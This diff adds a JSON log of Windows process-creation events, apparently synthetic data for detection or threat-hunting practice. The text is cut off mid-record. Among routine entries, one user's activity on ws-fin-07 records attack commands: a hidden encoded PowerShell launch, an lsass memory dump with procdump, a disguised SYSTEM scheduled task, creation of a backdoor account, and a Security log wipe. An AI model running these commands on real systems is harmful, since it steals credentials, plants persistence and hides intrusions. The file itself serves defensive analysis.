@@ -1,0 +1,2072 @@
+{
+ "events": [
+  {
+   "@timestamp": "2026-10-20T08:01:39Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:02:18Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:03:16Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:05:56Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:06:33Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:12:26Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:14:11Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:14:43Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:16:05Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:29:01Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:30:14Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:31:37Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:33:09Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:35:50Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:38:02Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:39:10Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:40:13Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:42:41Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:45:46Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:46:33Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:50:40Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:54:39Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T08:59:13Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:04:37Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:08:31Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:13:09Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:31:11Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:33:17Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:34:09Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:34:15Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:35:37Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:43:07Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:43:25Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:52:42Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:56:42Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:59:17Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T09:59:59Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:02:40Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:09:16Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:12:19Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:15:33Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:18:40Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:18:44Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:19:25Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:20:00Z",
+   "event_type": "process_creation",
+   "user": "j.doe",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "high"
+  },
+  {
+   "@timestamp": "2026-10-20T10:23:00Z",
+   "event_type": "process_creation",
+   "user": "j.doe",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Users\\Public\\procdump64.exe",
+   "CommandLine": "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\ls.dmp",
+   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "severity": "critical"
+  },
+  {
+   "@timestamp": "2026-10-20T10:23:54Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:26:00Z",
+   "event_type": "process_creation",
+   "user": "j.doe",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\schtasks.exe",
+   "CommandLine": "schtasks.exe /create /tn \"OneDrive Sync Helper\" /tr C:\\Users\\Public\\upd.exe /sc onlogon /ru SYSTEM",
+   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "severity": "high"
+  },
+  {
+   "@timestamp": "2026-10-20T10:29:00Z",
+   "event_type": "process_creation",
+   "user": "j.doe",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\net.exe",
+   "CommandLine": "net.exe user svc_backup /add",
+   "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+   "severity": "high"
+  },
+  {
+   "@timestamp": "2026-10-20T10:29:42Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:32:00Z",
+   "event_type": "process_creation",
+   "user": "j.doe",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\wevtutil.exe",
+   "CommandLine": "wevtutil.exe cl Security",
+   "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+   "severity": "high"
+  },
+  {
+   "@timestamp": "2026-10-20T10:36:00Z",
+   "event_type": "1102",
+   "user": "j.doe",
+   "hostname": "ws-fin-07",
+   "severity": "high",
+   "message": "The audit log was cleared."
+  },
+  {
+   "@timestamp": "2026-10-20T10:36:35Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:37:52Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:38:03Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:38:11Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:48:51Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:50:46Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:51:47Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T10:55:02Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:06:43Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:12:03Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:12:30Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:17:51Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:22:26Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:22:40Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:28:27Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:31:17Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:33:09Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:34:55Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:35:30Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:41:51Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:42:31Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:42:58Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "ws-ops-04",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:43:49Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:47:56Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:50:38Z",
+   "event_type": "process_creation",
+   "user": "c.nguyen",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\explorer.exe",
+   "CommandLine": "explorer.exe",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:50:42Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:56:57Z",
+   "event_type": "process_creation",
+   "user": "d.okafor",
+   "hostname": "ws-fin-07",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T11:57:19Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:02:36Z",
+   "event_type": "process_creation",
+   "user": "a.khan",
+   "hostname": "ws-hr-02",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:04:16Z",
+   "event_type": "process_creation",
+   "user": "e.schmidt",
+   "hostname": "ws-eng-11",
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+   "CommandLine": "EXCEL.EXE /e",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:05:03Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -File C:\\IT\\inventory.ps1",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:08:42Z",
+   "event_type": "process_creation",
+   "user": "f.rossi",
+   "hostname": "srv-file-01",
+   "Image": "C:\\Windows\\System32\\svchost.exe",
+   "CommandLine": "svchost.exe -k netsvcs",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "severity": "info"
+  },
+  {
+   "@timestamp": "2026-10-20T12:09:47Z",
+   "event_type": "process_creation",
+   "user": "b.lopez",
